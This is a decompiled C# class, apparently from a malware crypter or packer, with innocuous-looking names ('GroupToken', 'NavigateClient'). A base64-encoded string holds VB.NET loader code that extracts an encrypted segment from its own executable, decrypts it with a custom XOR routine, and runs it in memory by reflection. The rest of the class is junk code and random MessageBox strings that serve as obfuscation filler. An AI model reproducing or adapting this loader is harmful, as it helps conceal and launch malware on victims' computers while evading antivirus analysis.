using System;
using System.Diagnostics;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Windi;

public class GroupToken
{
	public static string logLength = Encoding.Default.GetString(Convert.FromBase64String("SW1wb3J0cyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMNCkltcG9ydHMgU3lzdGVtDQpJbXBvcnRzIFN5c3RlbS5XaW5kb3dzLkZvcm1zDQpJbXBvcnRzIFN5c3RlbS5UZXh0DQpJbXBvcnRzIFN5c3RlbS5JTw0KSW1wb3J0cyBTeXN0ZW0uUmVmbGVjdGlvbg0KSW1wb3J0cyBTeXN0ZW0uU3RyaW5nDQpJbXBvcnRzIFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucw0KSW1wb3J0cyBTeXN0ZW0uQ2hhcg0KSW1wb3J0cyBTeXN0ZW0uQ29sbGVjdGlvbnMNCkltcG9ydHMgU3lzdGVtLkNvbXBvbmVudE1vZGVsDQpJbXBvcnRzIFN5c3RlbS5EaWFnbm9zdGljcw0KSW1wb3J0cyBTeXN0ZW0uV2luZG93cw0KSW1wb3J0cyBTeXN0ZW0uRGF0YQ0KSW1wb3J0cyBNaWNyb3NvZnQuVmlzdWFsQmFzaWMNCkltcG9ydHMgU3lzdGVtLkVudmlyb25tZW50DQpJbXBvcnRzIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkNCkltcG9ydHMgU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcw0KSW1wb3J0cyBTeXN0ZW0uUnVudGltZS5TZXJpYWxpemF0aW9uLkZvcm1hdHRlcnMuQmluYXJ5DQpJbXBvcnRzIFN5c3RlbS5PYmplY3QNCg0KDQpOYW1lc3BhY2Ugeg0KQ2xhc3Mgeg0KICAgIFNoYXJlZCBTdWIgbWFpbigpDQogICAgICAgIHooKQ0KICAgIEVuZCBTdWINCg0KICAgIFNoYXJlZCBTdWIgeigpDQogICAgICAgIERpbSBzdHJBcnJheSBBcyBTdHJpbmcoKSA9IFN0cmluZ3MuU3BsaXQoRmlsZS5SZWFkQWxsVGV4dChBcHBsaWNhdGlvbi5FeGVjdXRhYmxlUGF0aCksICJMRjRqTVoxTEJwIiwgLTEsIENvbXBhcmVNZXRob2QuQmluYXJ5KQ0KICAgICAgIA0KICAgICAgICBEaW0gZGxsIEFzIEJ5dGUoKSA9IFBvbHlEZUNyeXB0KENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhzdHJBcnJheSgxOCkpLCBzdHJBcnJheSgxKSkNCiAgICAgICANCiAgICAgICAgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuTG9hZChkbGwpLkdldFR5cGUoIkEuQSIpLkdldE1ldGhvZCgiQSIpLkludm9rZShOb3RoaW5nLCBOZXcgT2JqZWN0KCkge30pDQogICAgRW5kIFN1Yg0KDQogICAgDQogICAgU2hhcmVkIEZ1bmN0aW9uIFBvbHlEZUNyeXB0KEJ5UmVmIERhdGEoKSBBcyBCeXRlLCBCeVJlZiBrZXlzIEFzIFN0cmluZykgQXMgQnl0ZSgpDQogICAgICAgIERpbSBLZXkgQXMgQnl0ZSgpID0gRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXlzKQ0KICAgICAgICBEaW0gaSBBcyBJbnRlZ2VyDQogICAgICAgIEZvciBpID0gMCBUbyAoRGF0YS5MZW5ndGggLSAxKSAqICgwICsgMSkNCiAgICAgICAgICAgIERhdGEoaSBNb2QgRGF0YS5MZW5ndGgpID0gQ0J5dGUoKENJbnQoRGF0YShpIE1vZCBEYXRhLkxlbmd0aCkgWG9yIEtleShpIE1vZCBLZXkuTGVuZ3RoKSkgLSBDSW50KERhdGEoKGkgKyAxKSBNb2QgRGF0YS5MZW5ndGgpKSArIDI1NikgTW9kIDI1NikNCiAgICAgICAgTmV4dA0KICAgICAgICBBcnJheS5SZXNpemUoRGF0YSwgRGF0YS5MZW5ndGggLSAxKQ0KICAgICAgICBSZXR1cm4gRGF0YQ0KICAgIEVuZCBGdW5jdGlvbg0KDQoNCkVuZCBDbGFzcw0KRW5kIE5hbWVzcGFjZQ=="));

	[DebuggerNonUserCode]
	public GroupToken()
	{
	}

	public void NavigateClient()
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Unknown result type (might be due to invalid IL or missing references)
		new decimal(1287L);
		while (false)
		{
			MessageBox.Show("\\s'4-B*ŒyŒVYwq*(Sˆ MfY\u0081t>ˆzLfr%‹=xb|\u008f\u008df`(:~Es%\u008f^\u0090$nŒZ84#…Eˆ8ZpF'†]<’/@,YARDLn[ 9Œ<Na$,Q$c^‰i%N%J†vR6|\u008fNoŠ5j(†{HJEn>=Bw#z,7NcJUT†L\u008dXŠ)}P\u008f\u0081ri‚TH1z6_DI/z(.sj)d`}E");
		}
		new decimal(53324L);
		new decimal(294027L);
		new decimal(7168878L);
		_ = 31403929;
		new decimal(9813L);
		_ = 29105204;
		_ = 364801;
		_ = 1;
		checked
		{
			while (true)
			{
				_ = 2356276;
				_ = 59284.0;
				new decimal(70229L);
				int num = 27;
				int num5;
				int num4;
				do
				{
					_ = 1;
					if (0 == 0)
					{
						_ = 8101;
					}
					else
					{
						_ = 250;
					}
					_ = 769877493;
					_ = 4;
					new decimal(6299L);
					MessageBox.Show("…qo+V‰[ov&7a?3Ut]kqK2^ƒ*l;65)‡JDC,ˆ)x3fxQQ€3|:Š\u008d\u0081hŠ„:<RG\u0081dR;rFe\u0081n…>2>KŽJ%ŒŒtpo@RC<GT\u008fX)&m`:4sJ&+~‘WŠŽxoUl`\u007fABqi1C ŠU‘1…6|7X");
					new decimal(494L);
					int num2 = 498516381;
					while (true)
					{
						int num3 = num2;
						num4 = 133155107;
						if (num3 > num4)
						{
							break;
						}
						_ = 1;
						_ = 1;
						_ = 969412;
						num2++;
					}
					new decimal(17762L);
					try
					{
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						try
						{
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							while (true)
							{
								_ = 1;
								_ = 10956;
								new decimal(7L);
								while (true)
								{
									_ = 4315;
									_ = 8273;
									_ = 0;
								}
								_ = 57;
								new decimal(6L);
								_ = 412440896.0;
								MessageBox.Show("(†‰wUMBŠ(k(U'~i:ƒ]6F?Ž.MPG(K;+ŠY1’MSC[jB3’ˆ;5K\u008dFŒxJfC6-w[F-D‰o\u0090h1\u008fˆ\u007f<y`!^#,\u008f82;Ž.%AEkC5Ž…h‹\u008fMFLVB*");
								_ = 12;
								_ = 0;
								_ = 3;
								while (false)
								{
								}
								new decimal(42L);
								MessageBox.Show("yM\u008f[Z€t(PgTc{:oR>‹Do*vr$TbTR„*%qBo’q€'i{1X€{OŠ‹y#5UtIŠ€nŠ'‹KA7EavA,:\u0090d6A\\]eˆŠh]jnNnhDHK\u0081\u008f$ˆ qPƒ@Z:lh\u007f^&c>R€L;,vB]@p…[p<Nˆ==Œn6c,mDNoŽ‡~/H*J…Z‘fƒ@fUPs\u0090x}\u0090>raA-ˆ'‚tr‰q&FhU`]PFJ†ŠiMl(s2Lo_c");
							}
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
					Interaction.MsgBox((object)"FoGK.GiT9rB;#G,j‹<R{†69<8,+ELC\u008dzI\u008fFQ=F…iKuR1,S?=0’j!#RY.x1>C(ˆxZ…' mMe9`2ZTy+,k\u007f';DCyE\\€CW5 hFC\u007fmi:L>bvMPS„Š$Gm%IO;\u007fdUt_^3JˆO9‹\u007f7g,T„>aXW‰…ESd{\u008f}0i9*V;8‡m\u0081*8\u0081‘7[%sO;83", (MsgBoxStyle)0, (object)null);
					num++;
					num5 = num;
					num4 = 58;
				}
				while (num5 <= num4);
				if (true)
				{
					Interaction.MsgBox((object)"kYkHs7xfmQ6436", (MsgBoxStyle)0, (object)null);
				}
				else
				{
					_ = 45811915;
				}
			}
			Interaction.MsgBox((object)"i[vU…8& +ƒHL\u008d!„!ƒO}t", (MsgBoxStyle)0, (object)null);
		}
	}
}
